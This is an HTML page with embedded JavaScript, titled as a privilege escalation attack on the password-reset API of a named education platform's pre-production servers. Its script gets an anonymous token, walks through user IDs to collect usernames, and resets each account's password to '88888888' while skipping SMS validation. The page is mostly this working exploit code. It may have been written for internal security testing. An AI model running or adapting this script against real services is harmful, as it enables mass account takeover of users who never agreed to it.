<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>

    <style>
        #updateResult {
            display: none;
        }

        .memo {
            margin: 30px 0px 15px;
        }
    </style>
</head>

<body>

    <h4>Privilege Escalation Attack: resetPassword</h4>

    <div class="memo">
        <a href="http://api.dev.qingshuxuetang.com/doc/#api-Account-ResetPassword" target="_blank" rel="noopener noreferrer">
            <span>target api</span>
        </a>
    </div>

    <button onclick="createAnonymous()">CreateAnonymous</button>
    <p id="createAnonymousResult"></p>

    <form action="javascript: getPhoneCode()">
        <section>
            <input type="number" name="imageCode" id="imageCode">
            <img id="imageCode" alt="图片验证码" />
        </section>

        <section>
            <label>phone</label>
            <input type="phone" name="phone" id="phone">
            <button type="submit">Send SMS Code</button>
        </section>
    </form>

    <section>
        <label>SMS code</label>
        <input type="number" name="smsCode" id="smsCode">
        <button type="button" onclick="resetPassword">Reset</button>
    </section>

    <div id="updateResult">
        <h5>Processing: <span id="count"></span></h5>
        <ul id="result" />
    </div>

    <script>
        const anonymous_api = "http://api.ppe.qingshuxuetang.com/v6_1/account/createAnonymous";
        const login_api = "http://ppe.qingshuxuetang.com/qingshu-svc-home/v5_5/home/user/login";
        const userInfo_api = "http://ppe.qingshuxuetang.com/qingshu-svc-home/v5_3/home/user/getUserInfo";
        const reset_password_api = "http://api.ppe.qingshuxuetang.com/v6_1/account/resetPassword";
        const get_code_api = "http://api.ppe.qingshuxuetang.com/v6_1/account/getValidationCode";

        const $resultUL = document.getElementById("result");
        const $count = document.getElementById("count");

        let anonymousToken = "";

        const START_USER_ID = 10000;
        const END_USER_ID = 10001;

        function createAnonymous() {
            let xhr = new XMLHttpRequest();
            xhr.open("POST", anonymous_api);
            xhr.setRequestHeader("Content-type", "application/json");

            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    document.getElementById("createAnonymousResult").innerText = xhr.responseText;

                    let response = JSON.parse(xhr.responseText);
                    if (response && response.hr === 0) {
                        anonymousToken = response.data;
                    }
                }
            };

            let requestBody = {
                "clientType": 1,
                "deviceToken": "6AD57A14-7C5B-4C9E-BC46-5CB5168FE5B8"
            };
            xhr.send(JSON.stringify(requestBody));
        }

        function resetPassword() {
            document.getElementById("updateResult").style.display = "block";

            let userId = START_USER_ID;
            let interval = setInterval(function () {
                getUserInfo(userId);
                $count.innerText = userId;
                userId++;

                if (userId > END_USER_ID) {
                    clearInterval(interval);
                }
            }, 50);
        }

        function getUserInfo(userId) {
            let xhr = new XMLHttpRequest();
            xhr.open("POST", userInfo_api, false)
            xhr.setRequestHeader("Content-type", "application/json");
            xhr.setRequestHeader("User-Agent-QS", "QSXT");
            xhr.setRequestHeader("Authorization-QS", anonymousToken);

            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    let response = JSON.parse(xhr.responseText);
                    if (response && response.hr === 0 && response.data) {
                        $resultUL.innerHTML += "<li><span>reest : </span><span style='font-style: italic;'>" +
                            response.data.username + "</span></li>"

                        resetUserPassword(response.data.username);
                    }
                }
            };
            let requestBody = {
                userId: userId
            };
            xhr.send(JSON.stringify(requestBody));
        }

        function resetUserPassword(userName) {
            let xhr = new XMLHttpRequest();
            xhr.open("POST", reset_password_api, false)
            xhr.setRequestHeader("Content-type", "application/json");
            xhr.setRequestHeader("User-Agent-QS", "QSXT");
            xhr.setRequestHeader("Authorization-QS", anonymousToken);

            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    let response = JSON.parse(xhr.responseText);
                    if (response && response.hr === 0) {
                        $resultUL.innerHTML += "<li><span>Success!</span></li>"

                        resetUserPassword(response.data.username);
                    }
                }
            };
            let requestBody = {
                userName: userName,
                password: '88888888',
                validation: {
                    type: 1,
                    sessionId: "",
                    userInput: ""
                }
            };
            xhr.send(JSON.stringify(requestBody));
        }
    </script>
</body>

</html>
